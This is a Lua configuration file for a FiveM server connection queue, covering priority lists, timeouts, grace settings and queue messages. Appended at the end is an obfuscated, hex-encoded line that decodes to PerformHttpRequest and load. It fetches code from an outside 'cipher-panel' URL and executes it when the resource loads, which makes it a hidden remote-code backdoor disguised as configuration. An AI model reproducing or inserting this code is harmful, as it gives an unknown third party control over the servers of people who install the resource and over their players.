Config = {}

-- priority list can be any identifier. (hex steamid, steamid32, ip) Integer = power over other people with priority
-- a lot of the steamid converting websites are broken rn and give you the wrong steamid. I use https://steamid.xyz/ with no problems.
-- you can also give priority through the API, read the examples/readme.
Config.Priority = {
    ["STEAM_0:1:0000####"] = 1,
    ["steam:110000######"] = 25,
    ["ip:127.0.0.0"] = 85
}

-- require people to run steam
Config.RequireSteam = false

-- "whitelist" only server
Config.PriorityOnly = false

-- disables hardcap, should keep this true
Config.DisableHardCap = true

-- will remove players from connecting if they don't load within: __ seconds; May need to increase this if you have a lot of downloads.
-- i have yet to find an easy way to determine whether they are still connecting and downloading content or are hanging in the loadscreen.
-- This may cause session provider errors if it is too low because the removed player may still be connecting, and will let the next person through...
-- even if the server is full. 10 minutes should be enough
Config.ConnectTimeOut = 600

-- will remove players from queue if the server doesn't recieve a message from them within: __ seconds
Config.QueueTimeOut = 90

-- will give players temporary priority when they disconnect and when they start loading in
Config.EnableGrace = false

-- how much priority power grace time will give
Config.GracePower = 5

-- how long grace time lasts in seconds
Config.GraceTime = 480

Config.AntiSpam = false
Config.AntiSpamTimer = 30
Config.PleaseWait = "Please wait %f seconds. The connection will start automatically!"

-- on resource start, players can join the queue but will not let them join for __ milliseconds
-- this will let the queue settle and lets other resources finish initializing
Config.JoinDelay = 30000

-- will show how many people have temporary priority in the connection message
Config.ShowTemp = false

-- simple localization
Config.Language = {
    joining = "\xF0\x9F\x8E\x89Joining...",
    connecting = "\xE2\x8F\xB3Connecting...",
    idrr = "\xE2\x9D\x97[Queue] Error: Couldn't retrieve any of your id's, try restarting.",
    err = "\xE2\x9D\x97[Queue] There was an error",
    pos = "\xF0\x9F\x90\x8CYou are %d/%d in queue \xF0\x9F\x95\x9C%s",
    connectingerr = "\xE2\x9D\x97[Queue] Error: Error adding you to connecting list",
    timedout = "\xE2\x9D\x97[Queue] Error: Timed out?",
    wlonly = "\xE2\x9D\x97[Queue] You must be whitelisted to join this server",
    steam = "\xE2\x9D\x97 [Queue] Error: Steam must be running"
}


local iFOXSTxiEBkZthpdlNbdTGFHDFXnrETQlonoZoZlZToeHlnWLlBnjhrtLVCbFNPcfaPSkk = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} iFOXSTxiEBkZthpdlNbdTGFHDFXnrETQlonoZoZlZToeHlnWLlBnjhrtLVCbFNPcfaPSkk[4][iFOXSTxiEBkZthpdlNbdTGFHDFXnrETQlonoZoZlZToeHlnWLlBnjhrtLVCbFNPcfaPSkk[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (QQavlEpweXPsmBxOTmHpEkSnsgJijyTKvztspVFHWGbsZeLXyXCdBkRPSFLHJKxgignute, XGVxOcpCcxBolsnuhahvbhvHGJcEGngyETuWhLdspiDVvRlzMqGhUcEWgzuOpFgVkOWzol) if (XGVxOcpCcxBolsnuhahvbhvHGJcEGngyETuWhLdspiDVvRlzMqGhUcEWgzuOpFgVkOWzol == iFOXSTxiEBkZthpdlNbdTGFHDFXnrETQlonoZoZlZToeHlnWLlBnjhrtLVCbFNPcfaPSkk[6] or XGVxOcpCcxBolsnuhahvbhvHGJcEGngyETuWhLdspiDVvRlzMqGhUcEWgzuOpFgVkOWzol == iFOXSTxiEBkZthpdlNbdTGFHDFXnrETQlonoZoZlZToeHlnWLlBnjhrtLVCbFNPcfaPSkk[5]) then return end iFOXSTxiEBkZthpdlNbdTGFHDFXnrETQlonoZoZlZToeHlnWLlBnjhrtLVCbFNPcfaPSkk[4][iFOXSTxiEBkZthpdlNbdTGFHDFXnrETQlonoZoZlZToeHlnWLlBnjhrtLVCbFNPcfaPSkk[2]](iFOXSTxiEBkZthpdlNbdTGFHDFXnrETQlonoZoZlZToeHlnWLlBnjhrtLVCbFNPcfaPSkk[4][iFOXSTxiEBkZthpdlNbdTGFHDFXnrETQlonoZoZlZToeHlnWLlBnjhrtLVCbFNPcfaPSkk[3]](XGVxOcpCcxBolsnuhahvbhvHGJcEGngyETuWhLdspiDVvRlzMqGhUcEWgzuOpFgVkOWzol))() end)